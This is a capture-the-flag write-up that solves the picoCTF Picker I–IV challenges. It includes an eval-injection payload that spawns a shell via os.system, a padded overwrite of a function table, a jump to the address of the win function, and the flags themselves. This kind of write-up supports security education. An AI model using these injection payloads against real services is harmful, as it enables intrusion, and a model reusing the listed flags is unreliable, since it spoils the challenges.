# Picker

## Picker I

AUTHOR:  LT 'SYREAL' JONES

### Description

This service can provide you with a random number, but can it do anything else?

Connect to the program with netcat:`$ nc saturn.picoctf.net <port>`<br>
The program's source code can be downloaded  [here](https://artifacts.picoctf.net/c/514/picker-I.py).

### Solution

The program takes in user input and passed is to `eval` => `eval(user_input + '()')`. 

The function which  seems interesting is `win`. It prints flag characters as hex.
```py
  75   │ def win():
  76   │   # This line will not work locally unless you create your own 'flag.txt' in
  77   │   #   the same directory as this script
  78   │   flag = open('flag.txt', 'r').read()
  79   │   #flag = flag[:-1]
  80   │   flag = flag.strip()
  81   │   str_flag = ''
  82   │   for c in flag:
  83   │     str_flag += str(hex(ord(c))) + ' '
  84   │   print(str_flag)
  85   │   
```

```bash
└─$ nc saturn.picoctf.net <port>
Try entering "getRandomNumber" without the double quotes...
==> win
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d 
Try entering "getRandomNumber" without the double quotes...
==> quit

└─$ python3
>>> s = '0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d'
>>> for i in map(lambda i: int(i, 16), s.split()): print(chr(i), end='')
... 
picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}>>> 
>>> exit()
```
::: tip Flag
`picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}`
:::

## Picker II

### Description

Can you figure out how this program works to get the flag?

Connect to the program with netcat: `$ nc saturn.picoctf.net <port>`<br>
The program's source code can be downloaded  [here](https://artifacts.picoctf.net/c/522/picker-II.py).

### Solution

Since  `win` is filtered from user input we have to improvise. We could have said `==> print(open('flag.txt').read())`, but what if we didn't know the filename? I decided to pop a shell and cat the flag. (A bit overkill)

```bash
└─$ nc saturn.picoctf.net <port>
==> (lambda os: os.system('sh'))(__import__('os'))
cat flag*
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
```
::: tip Flag
`picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}`
:::
::: info :information_source:
You can use [Flatliner](https://flatliner.herokuapp.com) app to turn python code into one liners.
:::

## Picker III

### Description

Can you figure out how this program works to get the flag?

Connect to the program with netcat: `$ nc saturn.picoctf.net <port>`<br>
The program's source code can be downloaded  [here](https://artifacts.picoctf.net/c/525/picker-III.py).

### Solution

From `reset_table` we know what functions we can execute using indexes. `write_variable` looks interesting. If we overwrite `func_table` with the payload we can get flag. 

```py
def reset_table():
  global func_table

  # This table is formatted for easier viewing, but it is really one line
  func_table = \
'''\
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
'''
```

I was fiddling around to spawn a shell, but couldnt. So final payload is:
```py
>>> 'win' + ' ' + 'A' * ((32*4) - 3 - 1)
     |       |     |        |     |   └─ space
     |       v     |        |     └─ function length
	 |	   space   |        └─ table variable size
     v             v
flag function   padding           

win AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```bash
└─$ nc saturn.picoctf.net 56609
==> 3
Please enter variable name to write: func_table
Please enter new value of variable: "win AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
==> 1
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x61 0x31 0x38 0x36 0x66 0x39 0x61 0x63 0x7d 
==> exit
                                                                                                                                       
└─$ echo -n '0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x61 0x31 0x38 0x36 0x66 0x39 0x61 0x63 0x7d' | xxd -r -p
picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_a186f9ac}
```
::: tip Flag
`picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_a186f9ac}`
::: 

## Picker IV

### Description

Can you figure out how this program works to get the flag?

Connect to the program with netcat: `$ nc saturn.picoctf.net <port>`<br> 
The program's source code can be downloaded  [here](https://artifacts.picoctf.net/c/528/picker-IV.c). <br>
The binary can be downloaded  [here](https://artifacts.picoctf.net/c/528/picker-IV).

### Analysis

The main program takes in address and then makes a call to function at that address. The function which we should jump into (in this case) is `win` function.

```c
int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

Basic checks usin `checksec` (from pwntools)

<details>
<summary> Arch:     amd64-64-little</summary>
Arch: `amd64-64-little` refers to the architecture of the binary, indicating that it is compiled for the AMD64 (x86-64) architecture, which is commonly used in 64-bit systems.
</details>
<details>
<summary> RELRO:    Partial RELRO</summary>
RELRO: `Partial RELRO` refers to the Relocation Read-Only (RELRO) protection. RELRO is a security feature that aims to protect against certain types of attacks, such as the Global Offset Table (GOT) overwrite attack. `Partial RELRO` means that only certain parts of the binary's relocation table are marked as read-only, providing partial protection.
</details>
<details>
<summary> Stack:    No canary found</summary>
Stack: `No canary found` indicates that there is no stack canary present in the binary. A stack canary is a security mechanism used to detect stack-based buffer overflows. Its absence may make the program more vulnerable to such attacks.
</details>
<details>
<summary> NX:       NX enabled</summary>
NX: `NX enabled` refers to the No-Execute (NX) or Execute Disable (XD) protection, which is a hardware feature that prevents executing code from regions of memory marked as data. With NX enabled, it is more difficult for attackers to execute arbitrary code in areas that should only contain data, helping to prevent certain types of exploits.
</details>
<details>
<summary> PIE:      No PIE (0x400000)</summary>
PIE: `No PIE (0x400000)` indicates that the binary is not Position Independent Executable (PIE). PIE is a security feature that randomizes the base address of the executable in memory, making it harder for attackers to predict memory addresses and exploit certain vulnerabilities.	
</details> 

Since PIE is disabled it means local binary and remote binary have the same exact memory addresses.

```bash
└─$ gdb -q ./picker-IV
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
...
0x0000000000401270  frame_dummy
0x0000000000401276  print_segf_message
0x000000000040129e  win
0x0000000000401334  main
...
```

### Solution 

```bash
└─$ nc saturn.picoctf.net <port> #                   win function address
Enter the address in hex to jump to, excluding '0x': 000000000040129e
You input 0x40129e
You won!
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}
```
::: tip Flag
`picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_14bc5444}`
:::